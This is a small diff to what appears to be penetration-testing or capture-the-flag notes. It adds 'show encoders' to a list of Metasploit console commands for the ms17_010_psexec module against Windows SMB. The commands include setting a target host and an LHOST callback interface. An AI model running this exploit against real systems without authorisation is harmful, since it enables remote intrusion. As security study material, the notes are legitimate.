@@ -455,6 +455,7 @@ msf6 exploit(windows/smb/ms17_010_psexec) > info
 msf6 exploit(windows/smb/ms17_010_psexec) > options
 msf6 exploit(windows/smb/ms17_010_psexec) > advanced
 msf6 exploit(windows/smb/ms17_010_psexec) > show targets
+msf6 exploit(windows/smb/ms17_010_psexec) > show encoders
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS <IP address>
 msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
 msf6 exploit(windows/smb/ms17_010_psexec) > check
